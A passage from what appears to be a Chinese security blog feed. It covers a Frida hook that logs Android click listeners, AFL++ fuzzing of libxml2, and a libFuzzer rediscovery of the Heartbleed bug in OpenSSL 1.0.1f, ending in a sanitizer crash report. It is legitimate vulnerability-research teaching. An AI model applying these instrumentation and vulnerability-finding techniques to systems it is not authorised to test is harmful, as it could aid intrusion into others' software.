class="variable language_">this</span>[mtdName].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">OnClickListener</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//以spawn启动进程的模式来attach的话</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.view.View&quot;</span>).<span class="property">setOnClickListener</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">listener</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (listener != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="title function_">watch</span>(listener, <span class="string">&#x27;onClick&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setOnClickListener</span>(listener);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果frida以attach的模式进行attch的话</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;android.view.View$ListenerInfo&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">instance</span>) &#123;</span><br><span class="line">                instance = instance.<span class="property">mOnClickListener</span>.<span class="property">value</span>;</span><br><span class="line">                <span class="keyword">if</span> (instance) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mOnClickListener name is :&quot;</span> + <span class="title function_">getObjClassName</span>(instance));</span><br><span class="line">                    <span class="title function_">watch</span>(instance, <span class="string">&#x27;onClick&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(<span class="title class_">OnClickListener</span>);</span><br></pre></td></tr></table></figure>





<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p>mobsf: <a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">https://github.com/MobSF/Mobile-Security-Framework-MobSF</a></p>
]]></content>
      <categories>
        <category>Android安全</category>
        <category>frida</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
        <tag>frida</tag>
      </tags>
  </entry>
  <entry>
    <title>afl fuzz libxml2</title>
    <url>/2021/11/05/afl-fuzz-libxml2/</url>
    <content><![CDATA[<p>模糊测试复现笔记</p>
<span id="more"></span>

<h1 id="使用AFL-模糊测试libxml2"><a href="#使用AFL-模糊测试libxml2" class="headerlink" title="使用AFL++模糊测试libxml2"></a>使用AFL++模糊测试libxml2</h1><h2 id="简单模糊测试"><a href="#简单模糊测试" class="headerlink" title="简单模糊测试"></a>简单模糊测试</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">在这里的时候需要用绝对路径相对路径是会报错的。</span><br><span class="line">/home/fourth/fuzz</span><br><span class="line">$ make CC=/home/fourth/fuzz/AFLplusplus/afl-clang-fast CXX=/home/fourth/fuzz/AFLplusplus/afl-clang-fast++ LD=/home/fourth/fuzz/AFLplusplus/afl-clang-fast</span><br><span class="line"></span><br><span class="line">$ ../AFLplusplus/afl-fuzz -i ./in -o ./out -m none -d -- ./xmlint_cov @@</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">american fuzzy lop ++3.15a (default) [fast] &#123;0&#125;</span><br><span class="line">┌─ process timing ────────────────────────────────────┬─ overall results ────┐</span><br><span class="line">│        run time : 0 days, 0 hrs, 3 min, 47 sec      │  cycles done : 0     │</span><br><span class="line">│   last new path : 0 days, 0 hrs, 0 min, 1 sec       │  total paths : 1710  │</span><br><span class="line">│ last uniq crash : none seen yet                     │ uniq crashes : 0     │</span><br><span class="line">│  last uniq hang : none seen yet                     │   uniq hangs : 0     │</span><br><span class="line">├─ cycle progress ─────────────────────┬─ map coverage┴──────────────────────┤</span><br><span class="line">│  now processing : 1558.1 (91.1%)     │    map density : 1.00% / 4.98%      │</span><br><span class="line">│ paths timed out : 0 (0.00%)          │ count coverage : 3.23 bits/tuple    │</span><br><span class="line">├─ stage progress ─────────────────────┼─ findings in depth ─────────────────┤</span><br><span class="line">│  now trying : havoc                  │ favored paths : 330 (19.30%)        │</span><br><span class="line">│ stage execs : 25.4k/32.8k (77.41%)   │  new edges on : 509 (29.77%)        │</span><br><span class="line">│ total execs : 1.24M                  │ total crashes : 0 (0 unique)        │</span><br><span class="line">│  exec speed : 5649/sec               │  total tmouts : 1 (1 unique)        │</span><br><span class="line">├─ fuzzing strategy yields ────────────┴─────────────┬─ path geometry ───────┤</span><br><span class="line">│   bit flips : disabled (default, enable with -D)   │    levels : 9         │</span><br><span class="line">│  byte flips : disabled (default, enable with -D)   │   pending : 1435      │</span><br><span class="line">│ arithmetics : disabled (default, enable with -D)   │  pend fav : 109       │</span><br><span class="line">│  known ints : disabled (default, enable with -D)   │ own finds : 1707      │</span><br><span class="line">│  dictionary : n/a                                  │  imported : 0         │</span><br><span class="line">│havoc/splice : 1173/890k, 526/285k                  │ stability : 96.68%    │</span><br><span class="line">│py/custom/rq : unused, unused, unused, unused       ├───────────────────────┘</span><br><span class="line">│    trim/eff : 18.12%/6877, disabled                │          [cpu000:150%]</span><br><span class="line">└────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>

<h2 id="persistent-mode"><a href="#persistent-mode" class="headerlink" title="persistent mode"></a>persistent mode</h2><p>使用AFL++ 的persistent mode来加速fuzz</p>
<p>首先需要改写我们的主程序代码xmllint.c，其中带<code>+</code>的就是需要重新添加的。一般是循环10000次，是我自己少写了一个0，并且一般就是只需要修改的是main函数，然后把原来的main函数改一个名字即可。</p>
<p><code>__AFL_LOOP</code>就是告诉AFL，我们需要用到的是persistent mode。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ diff -u a/xmllint.c b/xmllint.c &gt; ./b/diff.patch</span><br><span class="line"></span><br><span class="line">***@ubuntu:~/fuzz/libxml2$ <span class="built_in">cat</span> ./b/diff.patch</span><br><span class="line">--- a/xmllint.c	2021-11-08 18:20:14.461467630 -0800</span><br><span class="line">+++ b/xmllint.c	2021-11-08 19:01:45.680069687 -0800</span><br><span class="line">@@ -3131,7 +3131,13 @@</span><br><span class="line">     int files = 0;</span><br><span class="line">     int version = 0;</span><br><span class="line">     const char* indent;</span><br><span class="line">-</span><br><span class="line">+    </span><br><span class="line">+    <span class="keyword">if</span>(argc&lt;2)</span><br><span class="line">+    	<span class="built_in">return</span> 1;</span><br><span class="line">+    <span class="keyword">while</span>(__AFL_LOOP(1000))</span><br><span class="line">+    	parseAndPrintFile(argv[1],NULL);</span><br><span class="line">+    <span class="built_in">return</span> 0;</span><br><span class="line">+    </span><br><span class="line">     <span class="keyword">if</span> (argc &lt;= 1) &#123;</span><br><span class="line"> 	usage(stderr, argv[0]);</span><br><span class="line"> 	<span class="built_in">return</span>(1);</span><br><span class="line"> 一般是需要改成下面的这个样子的 	</span><br><span class="line">+int main(int argc, char** argv) &#123;</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">if</span> (argc &lt; 2) <span class="built_in">return</span> 1;</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">while</span> (__AFL_LOOP(10000))</span><br><span class="line">+    parseAndPrintFile(argv[1], NULL);</span><br><span class="line">+</span><br><span class="line">+  <span class="built_in">return</span> 0;</span><br><span class="line">+</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> int</span><br><span class="line">-main(int argc, char **argv) &#123;</span><br><span class="line">+old_main(int argc, char **argv) &#123;</span><br><span class="line">     int i, acount;</span><br><span class="line">     int files = 0;</span><br><span class="line">     int version = 0;</span><br></pre></td></tr></table></figure>

<p>记住，在编译之前一定要先 <code>make clean</code> 否则会报错。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ../fuzz</span><br><span class="line">$ <span class="built_in">rm</span> xmllint</span><br><span class="line">$ make CC=~/AFLplusplus/afl-clang-fast CXX=~/AFLplusplus/afl-clang-fast++ LD=~/AFLplusplus/afl-clang-fast</span><br><span class="line">$ <span class="built_in">cp</span> xmllint ../fuzz/xmllint_persistent</span><br><span class="line">$ ../AFLplusplus/afl-fuzz -i <span class="keyword">in</span>/ -o out -m none -d -- ./xmllint_persistent @@</span><br></pre></td></tr></table></figure>

<p>可以看到模糊测试的速度大致提升了200倍。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">               american fuzzy lop ++3.15a (default) [fast] &#123;0&#125;</span><br><span class="line">┌─ process timing ────────────────────────────────────┬─ overall results ────┐</span><br><span class="line">│        run time : 0 days, 3 hrs, 22 min, 41 sec     │  cycles done : 3     │</span><br><span class="line">│   last new path : 0 days, 0 hrs, 0 min, 48 sec      │  total paths : 4212  │</span><br><span class="line">│ last uniq crash : none seen yet                     │ uniq crashes : 0     │</span><br><span class="line">│  last uniq hang : none seen yet                     │   uniq hangs : 0     │</span><br><span class="line">├─ cycle progress ─────────────────────┬─ map coverage┴──────────────────────┤</span><br><span class="line">│  now processing : 2166.3 (51.4%)     │    map density : 1.34% / 6.66%      │</span><br><span class="line">│ paths timed out : 0 (0.00%)          │ count coverage : 4.38 bits/tuple    │</span><br><span class="line">├─ stage progress ─────────────────────┼─ findings in depth ─────────────────┤</span><br><span class="line">│  now trying : havoc                  │ favored paths : 508 (12.06%)        │</span><br><span class="line">│ stage execs : 1212/5299 (22.87%)     │  new edges on : 863 (20.49%)        │</span><br><span class="line">│ total execs : 35.7M                  │ total crashes : 0 (0 unique)        │</span><br><span class="line">│  exec speed : 4039/sec               │  total tmouts : 2711 (233 unique)   │</span><br><span class="line">├─ fuzzing strategy yields ────────────┴─────────────┬─ path geometry ───────┤</span><br><span class="line">│   bit flips : disabled (default, enable with -D)   │    levels : 24        │</span><br><span class="line">│  byte flips : disabled (default, enable with -D)   │   pending : 2707      │</span><br><span class="line">│ arithmetics : disabled (default, enable with -D)   │  pend fav : 0         │</span><br><span class="line">│  known ints : disabled (default, enable with -D)   │ own finds : 4209      │</span><br><span class="line">│  dictionary : n/a                                  │  imported : 0         │</span><br><span class="line">│havoc/splice : 2467/16.6M, 1742/18.9M               │ stability : 97.27%    │</span><br><span class="line">│py/custom/rq : unused, unused, unused, unused       ├───────────────────────┘</span><br><span class="line">│    trim/eff : 13.36%/188k, disabled                │          [cpu000:150%]</span><br><span class="line">└────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>

<h2 id="QEMU-mode"><a href="#QEMU-mode" class="headerlink" title="QEMU mode"></a>QEMU mode</h2><p>假设我们没有源代码，所以就不能对源代码进行打补丁，所以我们就只能使用QEMU模式来对二进制文件来进行插桩。</p>
<p>首先需要的是编译程序（需要恢复对之前源代码的操作）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ../libxml2</span><br><span class="line">$ make clean</span><br><span class="line">$ make</span><br><span class="line">$ <span class="built_in">cp</span> xmllint ../fuzz/</span><br><span class="line">$ ../AFLplusplus/afl-fuzz -i <span class="keyword">in</span>/ -o out -m none -d -Q -- ./xmllint @@</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">           american fuzzy lop ++3.15a (default) [fast] &#123;0&#125;</span><br><span class="line">┌─ process timing ────────────────────────────────────┬─ overall results ────┐</span><br><span class="line">│ run time : 0 days, 19 hrs, 48 min, 42 sec │ cycles done : 0 │</span><br><span class="line">│ last new path : 0 days, 0 hrs, 0 min, 35 sec │ total paths : 3332 │</span><br><span class="line">│ last uniq crash : none seen yet │ uniq crashes : 0 │</span><br><span class="line">│ last uniq hang : 0 days, 0 hrs, 41 min, 25 sec │ uniq hangs : 2 │</span><br><span class="line">├─ cycle progress ─────────────────────┬─ map coverage┴──────────────────────┤</span><br><span class="line">│ now processing : 2335.9 (70.1%) │ map density : 3.47% / 11.94% │</span><br><span class="line">│ paths timed out : 0 (0.00%) │ count coverage : 3.53 bits/tuple │</span><br><span class="line">├─ stage progress ─────────────────────┼─ findings in depth ─────────────────┤</span><br><span class="line">│ now trying : splice 8 │ favored paths : 445 (13.36%) │</span><br><span class="line">│ stage execs : 51/110 (46.36%) │ new edges on : 807 (24.22%) │</span><br><span class="line">│ total execs : 10.5M │ total crashes : 0 (0 unique) │</span><br><span class="line">│ exec speed : 244.3/sec │ total tmouts : 4802 (272 unique) │</span><br><span class="line">├─ fuzzing strategy yields ────────────┴─────────────┬─ path geometry ───────┤</span><br><span class="line">│ bit flips : disabled (default, enable with -D) │ levels : 24 │</span><br><span class="line">│ byte flips : disabled (default, enable with -D) │ pending : 2401 │</span><br><span class="line">│ arithmetics : disabled (default, enable with -D) │ pend fav : 0 │</span><br><span class="line">│ known ints : disabled (default, enable with -D) │ own finds : 3329 │</span><br><span class="line">│ dictionary : n/a │ imported : 0 │</span><br><span class="line">│havoc/splice : 2147/5.38M, 1182/5.04M │ stability : 98.82% │</span><br><span class="line">│py/custom/rq : unused, unused, unused, unused ├───────────────────────┘</span><br><span class="line">│ trim/eff : 12.08%/53.4k, disabled │ [cpu000:750%]</span><br><span class="line">└────────────────────────────────────────────────────┘^C</span><br></pre></td></tr></table></figure>





<p>git clone 不行就是因为终端没有走代理，设置一些即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config –global http.proxy “192.168.1.238:1080”</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://aflplus.plus/docs/tutorials/libxml2_tutorial/">https://aflplus.plus/docs/tutorials/libxml2_tutorial/</a></p>
]]></content>
      <categories>
        <category>Fuzzing</category>
        <category>AFL</category>
      </categories>
      <tags>
        <tag>Fuzzing</tag>
      </tags>
  </entry>
  <entry>
    <title>heartbleed(CVE-2014-0160)</title>
    <url>/2021/11/14/heartbleed-CVE-2014-0160/</url>
    <content><![CDATA[<h1 id="心脏滴血漏洞复现（CVE-2014-0160）"><a href="#心脏滴血漏洞复现（CVE-2014-0160）" class="headerlink" title="心脏滴血漏洞复现（CVE 2014-0160）"></a>心脏滴血漏洞复现（CVE 2014-0160）</h1><p>基本信息</p>
<p>OpenSSL版本：1.0.1</p>
<p>fuzzer：libfuzzer</p>
<span id="more"></span>

<h2 id="编译OpenSSL"><a href="#编译OpenSSL" class="headerlink" title="编译OpenSSL"></a>编译OpenSSL</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar xzf openssl1.0.1f.tgz</span><br><span class="line"><span class="built_in">cd</span> openssl1.0.1f/</span><br><span class="line"></span><br><span class="line">./config</span><br><span class="line">make clean</span><br><span class="line">make CC=<span class="string">&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize=address,fuzzer -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-gep,trace-div&quot;</span> -j$(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure>

<p>首先是按照教程，但是后面会报错，因为高版本的libfuzzer并不支持了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-fsanitize-coverage=trace-pc-guard is no longer supported by libFuzzer.</span><br></pre></td></tr></table></figure>

<p>本来想的是修改libfuzzer的版本，但是，并不能成功，所以就参考libfuzzer官方的使用方法，在编译目标程序的时候命令修改成下面的形式（直接删除就好了）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make CC=<span class="string">&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize=fuzzer -fsanitize-coverage=trace-cmp,trace-gep,trace-div&quot;</span> -j$(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure>

<h2 id="编译fuzzer-target"><a href="#编译fuzzer-target" class="headerlink" title="编译fuzzer target"></a>编译fuzzer target</h2><p>The first step in using libFuzzer on a library is to implement a <em>fuzz target</em> – a function that accepts an array of bytes and does something interesting with these bytes using the API under test. like this:</p>
<figure class="highlight cc"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fuzz_target.cc</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> <span class="title">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Data, <span class="type">size_t</span> Size)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DoSomethingInterestingWithMyAPI</span>(Data, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// Non-zero return values are reserved for future use.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//openssl_fuzzer.cc</span></span><br><span class="line"><span class="comment">// Copyright 2016 Google Inc. All Rights Reserved.</span></span><br><span class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/ssl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CERT_PATH</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CERT_PATH</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">SSL_CTX *<span class="title">Init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">SSL_library_init</span>();</span><br><span class="line">  <span class="built_in">SSL_load_error_strings</span>();</span><br><span class="line">  <span class="built_in">ERR_load_BIO_strings</span>();</span><br><span class="line">  <span class="built_in">OpenSSL_add_all_algorithms</span>();</span><br><span class="line">  SSL_CTX *sctx;</span><br><span class="line">  <span class="built_in">assert</span> (sctx = <span class="built_in">SSL_CTX_new</span>(<span class="built_in">TLSv1_method</span>()));</span><br><span class="line">  <span class="comment">/* These two file were created with this command:</span></span><br><span class="line"><span class="comment">      openssl req -x509 -newkey rsa:512 -keyout server.key \</span></span><br><span class="line"><span class="comment">     -out server.pem -days 9999 -nodes -subj /CN=a/</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="built_in">assert</span>(<span class="built_in">SSL_CTX_use_certificate_file</span>(sctx, CERT_PATH <span class="string">&quot;server.pem&quot;</span>,</span><br><span class="line">                                      SSL_FILETYPE_PEM));</span><br><span class="line">  <span class="built_in">assert</span>(<span class="built_in">SSL_CTX_use_PrivateKey_file</span>(sctx, CERT_PATH <span class="string">&quot;server.key&quot;</span>,</span><br><span class="line">                                     SSL_FILETYPE_PEM));</span><br><span class="line">  <span class="keyword">return</span> sctx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> <span class="title">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="type">static</span> SSL_CTX *sctx = <span class="built_in">Init</span>();</span><br><span class="line">  SSL *server = <span class="built_in">SSL_new</span>(sctx);</span><br><span class="line">  BIO *sinbio = <span class="built_in">BIO_new</span>(<span class="built_in">BIO_s_mem</span>());</span><br><span class="line">  BIO *soutbio = <span class="built_in">BIO_new</span>(<span class="built_in">BIO_s_mem</span>());</span><br><span class="line">  <span class="built_in">SSL_set_bio</span>(server, sinbio, soutbio);</span><br><span class="line">  <span class="built_in">SSL_set_accept_state</span>(server);</span><br><span class="line">  <span class="built_in">BIO_write</span>(sinbio, data, size);</span><br><span class="line">  <span class="built_in">SSL_do_handshake</span>(server);</span><br><span class="line">  <span class="built_in">SSL_free</span>(server);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">clang++ -g openssl_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize=address,fuzzer \</span><br><span class="line">    -fsanitize-coverage=trace-cmp,trace-gep,trace-div \</span><br><span class="line">    -Iopenssl1.0.1f/include openssl1.0.1f/libssl.a openssl1.0.1f/libcrypto.a \</span><br><span class="line">    ../../libFuzzer/libFuzzer.a -o openssl_fuzzer</span><br></pre></td></tr></table></figure>

<p>然后创建一个文件夹，使用生成的<code>openssl_fuzzer</code>来测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> corpus1</span><br><span class="line">./openssl_fuzzer ./corpus1/</span><br></pre></td></tr></table></figure>

<p>然后就可以看到程序报错了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==4447==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000009748 at pc 0x000000435777 bp 0x7ffcbf76d0a0 sp 0x7ffcbf76c860</span><br><span class="line">READ of size 48384 at 0x629000009748 thread T0</span><br><span class="line">    #0 0x435776 in memcpy (/home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl_fuzzer+0x435776)</span><br><span class="line">    #1 0x4ce5cf in tls1_process_heartbeat /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/t1_lib.c:2586:3</span><br><span class="line">    #2 0x503b43 in ssl3_read_bytes /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/s3_pkt.c:1092:4</span><br><span class="line">    #3 0x50559b in ssl3_get_message /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/s3_both.c:457:7</span><br><span class="line">    #4 0x4ed420 in ssl3_get_client_hello /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/s3_srvr.c:941:4</span><br><span class="line">    #5 0x4eb8fe in ssl3_accept /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/s3_srvr.c:357:9</span><br><span class="line">    #6 0x4c92e2 in LLVMFuzzerTestOneInput /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl_fuzzer.cc:39:3</span><br><span class="line">    #7 0x67f862 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerLoop.cpp:556:15</span><br><span class="line">    #8 0x67eea5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerLoop.cpp:470:3</span><br><span class="line">    #9 0x6804b7 in fuzzer::Fuzzer::MutateAndTestOne() /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerLoop.cpp:698:19</span><br><span class="line">    #10 0x681005 in fuzzer::Fuzzer::Loop(std::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerLoop.cpp:830:5</span><br><span class="line">    #11 0x670076 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerDriver.cpp:824:6</span><br><span class="line">    #12 0x66b1a0 in main /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerMain.cpp:19:10</span><br><span class="line">    #13 0x7f7f3f2010b2 in __libc_start_main /build/glibc-eX1tMB/glibc-2.31/csu/../csu/libc-start.c:308:16</span><br><span class="line">    #14 0x41ea1d in _start (/home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl_fuzzer+0x41ea1d)</span><br><span class="line"></span><br><span class="line">0x629000009748 is located 0 bytes to the right of 17736-byte region [0x629000005200,0x629000009748)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #0 0x49715d in malloc (/home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl_fuzzer+0x49715d)</span><br><span class="line">    #1 0x519b0b in CRYPTO_malloc /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/crypto/mem.c:308:8</span><br><span class="line">    #2 0x505f7b in freelist_extract /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/s3_both.c:708:12</span><br><span class="line">    #3 0x505f7b in ssl3_setup_read_buffer /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/s3_both.c:770:10</span><br><span class="line">    #4 0x5062ec in ssl3_setup_buffers /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/s3_both.c:827:7</span><br><span class="line">    #5 0x4eb807 in ssl3_accept /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl1.0.1f/ssl/s3_srvr.c:292:9</span><br><span class="line">    #6 0x4c92e2 in LLVMFuzzerTestOneInput /home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl_fuzzer.cc:39:3</span><br><span class="line">    #7 0x67f862 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerLoop.cpp:556:15</span><br><span class="line">    #8 0x6808b8 in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerLoop.cpp:743:3</span><br><span class="line">    #9 0x680dd9 in fuzzer::Fuzzer::Loop(std::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerLoop.cpp:792:3</span><br><span class="line">    #10 0x670076 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerDriver.cpp:824:6</span><br><span class="line">    #11 0x66b1a0 in main /home/fourth/fuzz/libfuzzer-workshop-master/libFuzzer/Fuzzer/FuzzerMain.cpp:19:10</span><br><span class="line">    #12 0x7f7f3f2010b2 in __libc_start_main /build/glibc-eX1tMB/glibc-2.31/csu/../csu/libc-start.c:308:16</span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/fourth/fuzz/libfuzzer-workshop-master/lessons/05/openssl_fuzzer+0x435776) in memcpy</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  0x0c527fff9290: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0c527fff92a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0c527fff92b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0c527fff92c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x0c527fff92d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">=&gt;0x0c527fff92e0: 00 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa</span><br><span class="line">  0x0c527fff92f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c527fff9300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c527fff9310: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c527fff9320: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c527fff9330: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow byte legend (one shadow byte represents 8 application bytes):</span><br><span class="line">  Addressable:           00</span><br><span class="line">  Partially addressable: 01 02 03 04 05 06 07 </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after return:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span 